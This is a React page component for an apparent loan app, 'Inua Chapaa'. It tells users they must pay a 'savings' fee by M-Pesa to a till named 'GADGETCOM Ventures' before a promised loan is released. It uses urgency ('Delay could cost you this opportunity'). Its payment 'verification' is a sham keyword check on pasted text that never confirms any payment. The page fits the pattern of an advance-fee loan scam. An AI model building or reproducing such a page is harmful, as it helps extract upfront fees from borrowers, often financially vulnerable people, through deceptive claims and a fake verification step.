import React, { useState, useEffect } from 'react';
import '../styles/Verification.css';
import { useNavigate } from 'react-router-dom';

const Verification = () => {
  const [limit, setLimit] = useState(7000);
  const [savingAmount, setSavingAmount] = useState(160);
  const [messageVisible, setMessageVisible] = useState(false);
  const [mpesaMessage, setMpesaMessage] = useState('');
  const [verificationMessage, setVerificationMessage] = useState('');
  const [verificationClass, setVerificationClass] = useState('');

  const navigate = useNavigate();

  useEffect(() => {
    const storedLimit = parseFloat(localStorage.getItem('limit'));
    const storedSaveAmount = parseFloat(localStorage.getItem('saveamount'));
    if (!isNaN(storedLimit)) setLimit(storedLimit);
    if (!isNaN(storedSaveAmount)) setSavingAmount(storedSaveAmount);
  }, []);

  const copyTillNumber = () => {
    navigator.clipboard.writeText('5622370');
    alert('Till number copied!');
  };

  const openModal = () => setMessageVisible(true);
  const closeModal = () => {
    setMessageVisible(false);
    setMpesaMessage('');
    setVerificationMessage('');
    setVerificationClass('');
  };

  const verifyTransaction = () => {
    const message = mpesaMessage.trim().toLowerCase();

  if (
    message.includes('confirmed') &&
    message.includes('ksh') &&
    (message.includes('sent to') || message.includes('paid to')) &&
    message.includes('on')
  ) {
    setVerificationMessage('Payment verified successfully!');
    setVerificationClass('success');
    setTimeout(() => {
      closeModal(); // hide modal after a short delay
      navigate('/review');
    }, 1000); // 1 second delay to show success message briefly
  } else {
    setVerificationMessage('Please paste the full M-PESA confirmation message.');
    setVerificationClass('error');
  }
};

  const goToSavingsPlan = () => {
    window.location.href = 'savings';
  };

  return (
    <>
      <h3>.</h3>
      <div className="container">
        <h5>
          You're just one step away from receiving <strong>Ksh {limit.toLocaleString()}</strong>!
          <br /><br />
          Secure your loan by saving <strong>Ksh {savingAmount.toLocaleString()}</strong> now. 
          This strengthens your credit and confirms your legal identity and commitment.
          <br /><br />
          Delay could cost you this opportunity. Save now, access your loan, and unlock future benefits.
        </h5>

        <div className="labels">
          <button
            className="verify-btnn"
            onClick={goToSavingsPlan}
            style={{
              marginTop: '5%',
              color: 'orangered',
              background: 'linear-gradient(135deg, #31463f, #070930)',
              fontSize: 'medium',
            }}
          >
            Change Savings Plan
          </button>
        </div>

        <div className="loan-tabless">
          <div className="labels">
            <span style={{ marginLeft: '5%' }}>
              <strong>How to save to your INUA CHAPAA A/C:</strong>
            </span>
          </div>
          <div className="labels">
            Go to M~Pesa : <span style={{ marginLeft: '5.5%' }}><strong>M~pesa</strong></span>
          </div>
          <div className="labels">
            Lipa na M~Pesa : <span><strong>Buy Goods & Services</strong></span>
          </div>
          <div className="labels">
            Till Number : <span><strong>5622370</strong></span>
          </div>
          <div className="labels">
            Till Name : <span><strong>GADGETCOM Ventures</strong></span>
          </div>

          <div className="labels">
            <button className="verify-btnn" onClick={copyTillNumber} id="copytill">
              CLICK TO COPY TILL
            </button>
          </div>
          <div className="labels">
            Enter Amount :{' '}
            <span style={{ marginLeft: '13%' }}>
              <strong id="savingsamountt">Ksh {savingAmount.toLocaleString()}</strong>
            </span>
          </div>
          <div className="labels">
            Complete Payment :{' '}
            <span style={{ marginLeft: '3%' }}>
              <strong>Enter M~Pesa Pin</strong>
            </span>
          </div>

          <button className="open-modal-btn" onClick={openModal}>
            Verify Payment to Initiate Loan Disbursement
          </button>
        </div>

        <div className={`overlay ${messageVisible ? 'show' : ''}`}>
          <div className="modal">
            <h2>Verify Payments</h2>
            <p>
              Copy the entire confirmation message you received from M-PESA after
              making payments and paste in the text field below then click verify
              button
            </p>

            <textarea
              className="input-field"
              placeholder="Paste M-PESA Message Here"
              rows="4"
              value={mpesaMessage}
              onChange={(e) => setMpesaMessage(e.target.value)}
            />

            <button className="verify-btn" onClick={verifyTransaction}>
              VERIFY
            </button>

            {verificationMessage && (
              <div className={`message ${verificationClass}`}>{verificationMessage}</div>
            )}
          </div>
        </div>

        <div className="footer">© Inua Chapaa 2025</div>
      </div>
    </>
  );
};

export default Verification;
